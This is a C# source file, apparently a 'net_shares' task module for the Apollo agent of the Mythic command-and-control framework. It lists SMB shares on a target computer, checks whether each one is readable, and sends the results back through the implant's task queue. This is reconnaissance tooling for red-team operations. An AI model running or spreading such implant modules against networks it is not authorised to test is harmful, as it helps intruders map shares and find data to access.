#define COMMAND_NAME_UPPER

#if DEBUG
#define NET_SHARES
#endif

#if NET_SHARES

using ApolloInterop.Classes;
using ApolloInterop.Classes.Api;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Text;
using ST = System.Threading.Tasks;

namespace Tasks
{
    public class net_shares : Tasking
    {
        [DataContract]
        internal struct NetShareInformation
        {
            [DataMember(Name = "computer_name")]
            public string ComputerName;
            [DataMember(Name = "share_name")]
            public string ShareName;
            [DataMember(Name = "comment")]
            public string Comment;
            [DataMember(Name = "type")]
            public string Type;
            [DataMember(Name = "readable")]
            public bool Readable;
        }

        [DataContract]
        internal struct AceInformation
        {
            [DataMember(Name = "account")]
            public string Account;
            [DataMember(Name = "type")]
            public string Type;
            [DataMember(Name = "rights")]
            public string Rights;
            [DataMember(Name = "inherited")]
            public bool IsInherited;
        }

        private delegate int NetShareEnum(
            [MarshalAs(UnmanagedType.LPWStr)]
            string serverName,
            int level,
            ref IntPtr bufPtr,
            uint prefmaxlen,
            ref int entriesread,
            ref int totalentries,
            ref int resume_handle);

        private delegate int NetApiBufferFree(IntPtr lpBuffer);

        private NetShareEnum _pNetShareEnum;
        private NetApiBufferFree _pNetApiBufferFree;

        public enum ShareType : uint
        {
            STYPE_DISKTREE = 0,
            STYPE_PRINTQ = 1,
            STYPE_DEVICE = 2,
            STYPE_IPC = 3,
            STYPE_SPECIAL = 0x80000000,
            STYPE_CLUSTER_FS = 0x02000000,
            STYPE_CLUSTER_SOFS = 0x04000000,
            STYPE_CLUSTER_DFS = 0x08000000,
            STYPE_TEMPORARY = 0x40000000,
            STYPE_UNKNOWN = 10,
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct ShareInfo
        {
            public string shi1_netname;
            public ShareType shi1_type;
            public string shi1_remark;
            public ShareInfo(string sharename, ShareType sharetype, string remark)
            {
                this.shi1_netname = sharename;
                this.shi1_type = sharetype;
                this.shi1_remark = remark;
            }
            public override string ToString()
            {
                return shi1_netname;
            }
        }

        [DataContract]
        public struct NetSharesParameters
        {
            [DataMember(Name = "computer")] public string Computer;
        }


        public net_shares(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
        {
            _pNetApiBufferFree = _agent.GetApi().GetLibraryFunction<NetApiBufferFree>(Library.NETUTILS, "NetApiBufferFree");
            _pNetShareEnum = _agent.GetApi().GetLibraryFunction<NetShareEnum>(Library.SRVCLI, "NetShareEnum");
        }
        private ShareInfo[] EnumerateShares(string computer)
        {
            List<ShareInfo> ShareInfos = new List<ShareInfo>();
            int entriesread = 0;
            int totalentries = 0;
            int resume_handle = 0;
            int nStructSize = Marshal.SizeOf(typeof(ShareInfo));
            IntPtr bufPtr = IntPtr.Zero;
            int ret = _pNetShareEnum(computer, 1, ref bufPtr, 0xFFFFFFFF, ref entriesread, ref totalentries, ref resume_handle);
            if (ret == 0)
            {
                IntPtr currentPtr = bufPtr;
                for (int i = 0; i < entriesread; i++)
                {
                    ShareInfo shi1 = (ShareInfo)Marshal.PtrToStructure(currentPtr, typeof(ShareInfo));
                    ShareInfos.Add(shi1);
                    currentPtr = (IntPtr)(currentPtr.ToInt64() + nStructSize);
                }
                _pNetApiBufferFree(bufPtr);
                return ShareInfos.ToArray();
            }
            else
            {
                ShareInfos.Add(new ShareInfo("ERROR=" + ret.ToString(), ShareType.STYPE_UNKNOWN, string.Empty));
                return ShareInfos.ToArray();
            }
        }


        public override void Start()
        {
            TaskResponse resp;
            NetSharesParameters parameters = _jsonSerializer.Deserialize<NetSharesParameters>(_data.Parameters);
            string computer = parameters.Computer;
            if (string.IsNullOrEmpty(computer))
            {
                computer = Environment.GetEnvironmentVariable("COMPUTERNAME");
            }

            string[] errors = {"ERROR=53", "ERROR=5"};
            List<NetShareInformation> results = new List<NetShareInformation>();
            
            ShareInfo[] computerShares = EnumerateShares(computer);

            if (computerShares.Length > 0)
            {
                foreach (ShareInfo share in computerShares)
                {
                    var result = new NetShareInformation();
                    result.ComputerName = computer;
                    result.ShareName = share.shi1_netname;
                    result.Comment = share.shi1_remark;
                    try
                    {
                        string path = String.Format("\\\\{0}\\{1}", computer, share.shi1_netname);
                        var files = System.IO.Directory.GetFiles(path);
                        result.Readable = true;
                    }
                    catch
                    {
                        result.Readable = false;
                    }

                    switch (share.shi1_type)
                    {
                        case ShareType.STYPE_DISKTREE:
                            result.Type = "Disk Drive";
                            break;
                        case ShareType.STYPE_PRINTQ:
                            result.Type = "Print Queue";
                            break;
                        case ShareType.STYPE_DEVICE:
                            result.Type = "Communication Device";
                            break;
                        case ShareType.STYPE_IPC:
                            result.Type = "Interprocess Communication (IPC)";
                            break;
                        case ShareType.STYPE_SPECIAL:
                            result.Type = "Special Reserved for IPC.";
                            //result.Type = "Special share reserved for interprocess communication (IPC$) or remote administration of the server (ADMIN$). Can also refer to administrative shares such as C$, D$, E$, and so forth.";
                            break;
                        case ShareType.STYPE_CLUSTER_FS:
                            result.Type = "Cluster Share";
                            break;
                        case ShareType.STYPE_CLUSTER_SOFS:
                            result.Type = "Scale Out Cluster Share";
                            break;
                        case ShareType.STYPE_CLUSTER_DFS:
                            result.Type = "DFS Share in Cluster";
                            break;
                        case ShareType.STYPE_TEMPORARY:
                            result.Type = "Temporary Share";
                            break;
                        default:
                            result.Type = $"Unknown type ({share.shi1_type})";
                            break;
                    }

                    results.Add(result);
                }
            }

            resp = CreateTaskResponse(
                _jsonSerializer.Serialize(results.ToArray()), true);
            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }
    }
}

#endif